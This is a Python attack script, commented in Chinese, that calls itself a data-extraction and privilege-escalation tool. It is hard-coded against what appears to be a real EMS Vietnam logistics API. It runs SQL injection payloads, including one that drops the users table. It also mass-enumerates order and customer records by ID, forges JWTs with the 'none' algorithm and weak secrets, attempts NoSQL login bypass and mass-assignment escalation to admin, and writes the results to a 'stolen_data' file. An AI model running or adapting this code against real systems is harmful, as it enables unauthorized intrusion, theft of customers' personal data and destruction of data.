#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
EMS API 数据提取和权限提升工具
专注于实际获取数据和提权
"""

import requests
import json
import time
import base64
import hashlib
import random
import string
from urllib.parse import quote, unquote
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class EMSDataExtractor:
    """数据提取和提权工具"""
    
    def __init__(self, base_url: str):
        self.base_url = base_url.rstrip('/')
        self.api_base = f"{self.base_url}/api"
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0',
            'Accept': 'application/json',
            'Content-Type': 'application/json'
        })
        
        self.found_data = []
        self.valid_tokens = []
        
    def log(self, level: str, msg: str, data=None):
        emoji = {'SUCCESS': '✅', 'VULN': '🔥', 'DATA': '💰', 'ERROR': '❌'}
        print(f"{emoji.get(level, '•')} {msg}")
        if data:
            print(f"   {json.dumps(data, ensure_ascii=False)[:200]}")
    
    def advanced_sql_injection(self):
        """高级 SQL 注入测试"""
        print("\n" + "="*60)
        print("[1] 高级 SQL 注入测试")
        print("="*60)
        
        # 更多 SQL 注入载荷
        sql_payloads = [
            # Union-based
            "1' UNION SELECT NULL,NULL,NULL--",
            "1' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--",
            "1' UNION SELECT username,password,email FROM users--",
            "1' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
            
            # Boolean-based
            "1' AND '1'='1",
            "1' AND '1'='2",
            "1' OR 'x'='x",
            
            # Time-based
            "1' AND SLEEP(5)--",
            "1' OR SLEEP(5)--",
            "1'; WAITFOR DELAY '00:00:05'--",
            
            # Error-based
            "1' AND 1=CONVERT(int,(SELECT @@version))--",
            "1' AND extractvalue(1,concat(0x7e,version()))--",
            
            # Stacked queries
            "1'; DROP TABLE users--",
            "1'; SELECT * FROM users--",
            
            # Encoded
            "1%27%20OR%201=1--",
            "1' OR 1=1#",
            
            # NoSQL
            "{'$ne': null}",
            "{'$gt': ''}",
            "admin'||'1'='1",
        ]
        
        test_endpoints = [
            ('/order/detail', 'id'),
            ('/shipment/detail', 'id'),
            ('/customer/order/list', 'customer_id'),
            ('/notification/list', 'user_id'),
        ]
        
        for endpoint, param in test_endpoints:
            print(f"\n  测试: {endpoint}?{param}=...")
            
            for payload in sql_payloads[:15]:  # 测试前15个
                url = f"{self.api_base}{endpoint}?{param}={quote(payload)}"
                
                try:
                    start = time.time()
                    resp = self.session.get(url, timeout=10)
                    elapsed = time.time() - start
                    
                    # 检测时间差异（time-based blind SQLi）
                    if elapsed > 4:
                        self.log('VULN', f'可能存在时间盲注', {
                            'endpoint': endpoint,
                            'payload': payload,
                            'time': f'{elapsed:.2f}s'
                        })
                    
                    # 检测错误消息
                    resp_text = resp.text.lower()
                    sql_errors = [
                        'sql', 'mysql', 'sqlite', 'postgresql', 'oracle',
                        'syntax', 'query', 'database', 'table', 'column',
                        'select', 'union', 'where', 'odbc', 'jdbc'
                    ]
                    
                    if any(err in resp_text for err in sql_errors):
                        self.log('VULN', f'SQL 错误泄露', {
                            'endpoint': endpoint,
                            'payload': payload,
                            'error': resp_text[:300]
                        })
                    
                    # 检测成功的 Union
                    if resp.status_code == 200 and 'union' in payload.lower():
                        try:
                            data = resp.json()
                            if data:
                                self.log('DATA', f'Union 注入可能成功', {
                                    'endpoint': endpoint,
                                    'payload': payload,
                                    'data': data
                                })
                        except:
                            pass
                    
                except Exception as e:
                    pass
                
                time.sleep(0.1)
    
    def idor_mass_enumeration(self):
        """IDOR 批量数据枚举"""
        print("\n" + "="*60)
        print("[2] IDOR 批量数据枚举")
        print("="*60)
        
        endpoints = [
            '/order/detail',
            '/shipment/detail',
            '/customer/info',
            '/driver/get-user',
        ]
        
        # 测试更多 ID 范围
        id_ranges = [
            range(1, 101),      # 1-100
            range(1000, 1101),  # 1000-1100
            range(10000, 10051),# 10000-10050
        ]
        
        for endpoint in endpoints:
            print(f"\n  枚举: {endpoint}")
            found_count = 0
            
            for id_range in id_ranges:
                for obj_id in id_range:
                    url = f"{self.api_base}{endpoint}?id={obj_id}"
                    
                    try:
                        resp = self.session.get(url, timeout=3)
                        
                        if resp.status_code == 200:
                            try:
                                data = resp.json()
                                if data and isinstance(data, dict):
                                    found_count += 1
                                    self.found_data.append({
                                        'endpoint': endpoint,
                                        'id': obj_id,
                                        'data': data
                                    })
                                    
                                    self.log('DATA', f'发现数据: {endpoint}?id={obj_id}', data)
                                    
                            except:
                                pass
                    except:
                        pass
                    
                    time.sleep(0.05)
                
                if found_count > 0:
                    break  # 找到数据就切换到下一个 ID 范围
            
            if found_count > 0:
                self.log('SUCCESS', f'{endpoint} 共发现 {found_count} 条数据')
    
    def jwt_token_manipulation(self):
        """JWT Token 篡改和伪造"""
        print("\n" + "="*60)
        print("[3] JWT Token 篡改测试")
        print("="*60)
        
        # 先注册并登录获取 token
        print("  [*] 注册测试账号...")
        username = f"test_{random.randint(100000, 999999)}"
        register_data = {
            'username': username,
            'password': 'Test123!',
            'email': f'{username}@test.com',
            'phone': f"09{random.randint(10000000, 99999999)}"
        }
        
        try:
            resp = self.session.post(f"{self.api_base}/customer/register", json=register_data, timeout=10)
            print(f"    注册状态: {resp.status_code}")
        except:
            pass
        
        print("  [*] 登录获取 Token...")
        login_data = {
            'username': username,
            'password': 'Test123!'
        }
        
        try:
            resp = self.session.post(f"{self.api_base}/customer/login", json=login_data, timeout=10)
            
            if resp.status_code == 200:
                resp_data = resp.json()
                
                # 查找 token
                token = None
                for key in ['token', 'access_token', 'access', 'jwt', 'accessToken', 'auth_token']:
                    if key in resp_data:
                        token = resp_data[key]
                        break
                
                if token:
                    self.log('SUCCESS', '获取到 Token', {'token_preview': str(token)[:50]})
                    self.test_jwt_attacks(token)
                else:
                    self.log('ERROR', '未找到 Token 字段', resp_data)
        except Exception as e:
            self.log('ERROR', f'登录失败: {str(e)}')
    
    def test_jwt_attacks(self, token: str):
        """测试 JWT 攻击"""
        print("\n  [*] JWT 攻击测试...")
        
        # 分析 JWT 结构
        parts = str(token).split('.')
        
        if len(parts) != 3:
            self.log('ERROR', 'Token 格式不正确')
            return
        
        try:
            # 解码 header 和 payload
            header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
            payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
            
            self.log('DATA', 'JWT Header', header)
            self.log('DATA', 'JWT Payload', payload)
            
            # 攻击 1: None 算法
            print("\n    [1] 测试 None 算法...")
            none_header = base64.urlsafe_b64encode(
                json.dumps({'alg': 'none', 'typ': 'JWT'}).encode()
            ).decode().rstrip('=')
            
            # 修改 payload 提升权限
            modified_payload = payload.copy()
            modified_payload['role'] = 'admin'
            modified_payload['is_admin'] = True
            modified_payload['is_staff'] = True
            
            none_payload = base64.urlsafe_b64encode(
                json.dumps(modified_payload).encode()
            ).decode().rstrip('=')
            
            none_token = f"{none_header}.{none_payload}."
            
            # 测试修改后的 token
            test_url = f"{self.api_base}/customer/info"
            headers = {'Authorization': f'Bearer {none_token}'}
            
            try:
                resp = self.session.get(test_url, headers=headers, timeout=5)
                if resp.status_code == 200:
                    self.log('VULN', 'None 算法攻击成功！', resp.json())
                else:
                    print(f"      失败: {resp.status_code}")
            except:
                pass
            
            # 攻击 2: 弱密钥爆破
            print("\n    [2] 测试弱密钥...")
            weak_secrets = ['secret', 'secret123', 'password', '123456', 'jwt', 'key', '']
            
            for secret in weak_secrets:
                try:
                    import hmac
                    
                    # 使用弱密钥签名
                    message = f"{parts[0]}.{parts[1]}"
                    signature = base64.urlsafe_b64encode(
                        hmac.new(secret.encode(), message.encode(), hashlib.sha256).digest()
                    ).decode().rstrip('=')
                    
                    test_token = f"{message}.{signature}"
                    
                    headers = {'Authorization': f'Bearer {test_token}'}
                    resp = self.session.get(test_url, headers=headers, timeout=3)
                    
                    if resp.status_code == 200:
                        self.log('VULN', f'JWT 弱密钥发现: {secret}')
                        break
                        
                except:
                    pass
            
            # 攻击 3: 用户 ID 篡改
            print("\n    [3] 测试 ID 篡改...")
            for user_id in [1, 2, 100, 999, 10000]:
                modified = payload.copy()
                modified['user_id'] = user_id
                modified['id'] = user_id
                
                modified_payload = base64.urlsafe_b64encode(
                    json.dumps(modified).encode()
                ).decode().rstrip('=')
                
                tampered_token = f"{parts[0]}.{modified_payload}.{parts[2]}"
                
                headers = {'Authorization': f'Bearer {tampered_token}'}
                
                try:
                    resp = self.session.get(test_url, headers=headers, timeout=3)
                    if resp.status_code == 200:
                        data = resp.json()
                        self.log('VULN', f'ID 篡改成功 - 获取用户 {user_id} 数据', data)
                except:
                    pass
                
                time.sleep(0.2)
                
        except Exception as e:
            self.log('ERROR', f'JWT 解析失败: {str(e)}')
    
    def parameter_pollution_attacks(self):
        """参数污染攻击"""
        print("\n" + "="*60)
        print("[4] 参数污染和覆盖攻击")
        print("="*60)
        
        test_cases = [
            # HPP (HTTP Parameter Pollution)
            {'endpoint': '/order/detail', 'params': 'id=1&id=2&id=999'},
            {'endpoint': '/order/detail', 'params': 'id=1&user_id=999'},
            {'endpoint': '/customer/info', 'params': 'id=1&role=admin'},
            
            # Array injection
            {'endpoint': '/order/detail', 'params': 'id[]=1&id[]=2'},
            {'endpoint': '/order/detail', 'params': 'id[$ne]=null'},
            
            # Object injection  
            {'endpoint': '/order/detail', 'params': 'id[user_id]=999'},
        ]
        
        for test in test_cases:
            url = f"{self.api_base}{test['endpoint']}?{test['params']}"
            
            try:
                resp = self.session.get(url, timeout=5)
                
                if resp.status_code == 200:
                    try:
                        data = resp.json()
                        if data:
                            self.log('VULN', f"参数污染成功", {
                                'url': url,
                                'data': data
                            })
                    except:
                        pass
            except:
                pass
            
            time.sleep(0.2)
    
    def mass_assignment_test(self):
        """批量赋值漏洞测试"""
        print("\n" + "="*60)
        print("[5] 批量赋值漏洞测试")
        print("="*60)
        
        # 注册时尝试设置额外字段
        print("  [*] 测试注册时的批量赋值...")
        
        test_data = {
            'username': f"test_{random.randint(100000, 999999)}",
            'password': 'Test123!',
            'email': f'test{random.randint(1000, 9999)}@test.com',
            # 尝试提权字段
            'is_admin': True,
            'is_staff': True,
            'is_superuser': True,
            'role': 'admin',
            'user_type': 'admin',
            'permissions': ['all'],
            'credits': 999999,
            'balance': 999999,
        }
        
        try:
            resp = self.session.post(f"{self.api_base}/customer/register", json=test_data, timeout=10)
            
            if resp.status_code in [200, 201]:
                self.log('VULN', '批量赋值可能成功', {
                    'status': resp.status_code,
                    'response': resp.json()
                })
                
                # 尝试登录并检查权限
                login_data = {
                    'username': test_data['username'],
                    'password': test_data['password']
                }
                
                resp2 = self.session.post(f"{self.api_base}/customer/login", json=login_data, timeout=10)
                
                if resp2.status_code == 200:
                    self.log('DATA', '登录成功，检查权限', resp2.json())
        except Exception as e:
            pass
    
    def nosql_injection_test(self):
        """NoSQL 注入测试"""
        print("\n" + "="*60)
        print("[6] NoSQL 注入测试")
        print("="*60)
        
        nosql_payloads = [
            {"$gt": ""},
            {"$ne": None},
            {"$exists": True},
            {"$regex": ".*"},
            {"$where": "1==1"},
        ]
        
        # 测试登录绕过
        print("  [*] 测试登录绕过...")
        
        for payload in nosql_payloads:
            test_data = {
                'username': payload,
                'password': payload
            }
            
            try:
                resp = self.session.post(f"{self.api_base}/customer/login", json=test_data, timeout=5)
                
                if resp.status_code == 200:
                    self.log('VULN', 'NoSQL 注入登录绕过成功！', {
                        'payload': payload,
                        'response': resp.json()
                    })
            except:
                pass
            
            time.sleep(0.2)
    
    def api_key_enumeration(self):
        """API Key 和 Token 枚举"""
        print("\n" + "="*60)
        print("[7] API Key/Token 枚举")
        print("="*60)
        
        # 测试常见的 API key 参数
        common_params = ['api_key', 'apikey', 'key', 'token', 'access_token', 'auth_token']
        
        # 简单的 key 格式
        test_keys = [
            '12345678901234567890123456789012',
            'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa',
            '00000000000000000000000000000000',
            'admin',
            'test',
        ]
        
        for param in common_params:
            for key in test_keys:
                url = f"{self.api_base}/customer/info?{param}={key}"
                
                try:
                    resp = self.session.get(url, timeout=3)
                    
                    if resp.status_code == 200:
                        try:
                            data = resp.json()
                            if data:
                                self.log('VULN', f'API Key 绕过成功', {
                                    'param': param,
                                    'key': key,
                                    'data': data
                                })
                        except:
                            pass
                except:
                    pass
                
                time.sleep(0.1)
    
    def export_stolen_data(self):
        """导出窃取的数据"""
        if self.found_data:
            filename = f"stolen_data_{int(time.time())}.json"
            
            with open(filename, 'w', encoding='utf-8') as f:
                json.dump({
                    'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
                    'total_records': len(self.found_data),
                    'data': self.found_data
                }, f, ensure_ascii=False, indent=2)
            
            self.log('SUCCESS', f'窃取的数据已保存: {filename}')
            self.log('DATA', f'共获取 {len(self.found_data)} 条数据')
    
    def run(self):
        """运行完整测试"""
        print("\n" + "#"*70)
        print("# EMS API 数据提取和权限提升测试")
        print("# 专注于实际获取数据")
        print("#"*70)
        
        try:
            self.advanced_sql_injection()
            time.sleep(1)
            
            self.idor_mass_enumeration()
            time.sleep(1)
            
            self.jwt_token_manipulation()
            time.sleep(1)
            
            self.parameter_pollution_attacks()
            time.sleep(1)
            
            self.mass_assignment_test()
            time.sleep(1)
            
            self.nosql_injection_test()
            time.sleep(1)
            
            self.api_key_enumeration()
            
            # 导出数据
            self.export_stolen_data()
            
            print("\n" + "#"*70)
            print("# 测试完成！")
            print("#"*70)
            
        except KeyboardInterrupt:
            print("\n[!] 测试中断")
            self.export_stolen_data()
        except Exception as e:
            print(f"\n[!] 错误: {str(e)}")
            import traceback
            traceback.print_exc()


def main():
    target = "https://apilogistics.ems.com.vn:8080"
    
    print("="*70)
    print("EMS API 数据提取工具")
    print("专注于实际数据获取和权限提升")
    print("="*70)
    
    extractor = EMSDataExtractor(target)
    extractor.run()


if __name__ == "__main__":
    main()
